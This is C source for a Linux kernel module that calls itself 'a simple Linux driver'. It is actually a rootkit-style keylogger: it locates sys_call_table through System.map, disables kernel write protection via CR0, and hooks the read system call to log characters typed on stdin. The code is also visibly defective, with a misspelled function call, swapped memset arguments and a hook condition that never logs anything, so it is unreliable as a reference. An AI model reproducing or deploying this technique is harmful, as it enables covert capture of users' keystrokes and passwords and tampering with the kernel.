#include <linux/init.h>             // Macros used to mark up functions e.g., __init __exit
#include <linux/module.h>           // Core header for loading LKMs into the kernel
#include <linux/kernel.h>           // Contains types, macros, functions for the kernel
#include <linux/unistd.h>           /* sys_call_table __NR_* system call function indices */
#include <linux/fs.h>               /* filp_open */
#include <linux/slab.h>             /* kmalloc */

#include <asm/paravirt.h>           /* write_cr0 */
#include <asm/uaccess.h>            /* get_fs, set_fs */


#define BOOT_PATH "/boot/System.map-\0"
#define KERN_VERS "4.2.0-27-generic"
#define MAX_VERSION_LEN 256


MODULE_LICENSE("GPL");              ///< The license type -- this affects runtime behavior
MODULE_AUTHOR("acidghost");      ///< The author -- visible when you use modinfo
MODULE_DESCRIPTION("A simple Linux driver.");  ///< The description -- see modinfo
MODULE_VERSION("0.1");              ///< The version of the module


unsigned long *syscall_table = NULL;
// asmlinkage long sys_read(unsigned int fd, char __user *buf, size_t count);
asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);


static int set_syscall_table() {
  char system_map_entry[MAX_VERSION_LEN];
  struct file *f = NULL;
  unsigned int i = 0;

  printk(KERN_INFO "HK: starting module...\n");

  mm_segment_t oldfs = get_fs();
  set_fs(KERNEL_DS);

  size_t filename_length = strlen(KERN_VERS) + strlen(BOOT_PATH) + 1;
  char *filename = kmalloc(filename_length, GFP_KERNEL);
  if (filename == NULL) {
    printk(KERN_EMERG "HK: kmalloc failed on System.map-<version> filename allocation");
    return -1;
  }
  memset(filename, filename_length, 0);
  strncpy(filename, BOOT_PATH, strlen(BOOT_PATH)+1);
  strncat(filename, KERN_VERS, strlen(KERN_VERS));

  f = filp_open(filename, O_RDONLY, 0);
  if (IS_ERR(f) || (f == NULL)) {
    printk(KERN_EMERG "HK: Error opening System.map-<version> file: %s\n", filename);
    return -1;
  }

  memset(system_map_entry, 0, MAX_VERSION_LEN);

  i = 0;
  while (vfs_read(f, system_map_entry + i, 1, &f->f_pos) == 1) {
    if (system_map_entry[i] == '\n' || i == MAX_VERSION_LEN) {
      i = 0;
      if (strstr(system_map_entry, "sys_call_table") != NULL) {
        char *sys_string = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);
        char *system_map_entry_ptr = system_map_entry;
        if (sys_string == NULL) {
          filp_close(f, 0);
          set_fs(oldfs);
          kfree(filename);
          return -1;
        }
        memset(sys_string, 0, MAX_VERSION_LEN);
        strncpy(sys_string, strsep(&system_map_entry_ptr, " "), MAX_VERSION_LEN);
        kstrtoul(sys_string, 16, &syscall_table);
        printk(KERN_INFO "HK: syscall_table retrieved: %p\n", syscall_table);
        kfree(sys_string);
        break;
      }

      memset(system_map_entry, 0, MAX_VERSION_LEN);
      continue;
    }

    i++;
  }

  filp_close(f, 0);
  set_fs(oldfs);
  kfree(filename);

  return 0;
}

asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
  long error = original_read_syscall(fd, buf, count);
  if (error || count || count > 1 || fd != 0) {
    return error;
  }
  printk(KERN_INFO "HK: char\t%c\n", buf[0]);
  return error;
}

static int __init hk_module_init(void){
  if (set_syscal_table() != 0) {
    printk(KERN_EMERG "HK: error loading syscall_table\n");
  }

  if (syscall_table != NULL) {
    write_cr0(read_cr0() & (~ 0x10000));
    original_read_syscall = (void *) syscall_table[__NR_read];
    syscall_table[__NR_read] = &new_sys_read;
    write_cr0(read_cr0() | 0x10000);
    printk(KERN_INFO "HK: custom read hooked\n");
  }

  return 0;
}

static void __exit hk_module_exit(void) {
  printk(KERN_INFO "HK: module cleanup...\n");
  if (syscall_table != NULL) {
    write_cr0(read_cr0() & (~ 0x10000));
    syscall_table[__NR_read] = original_read_syscall;
    write_cr0(read_cr0() | 0x10000);
    printk(KERN_INFO "HK: original read restored\n");
  }
}


module_init(hk_module_init);
module_exit(hk_module_exit);
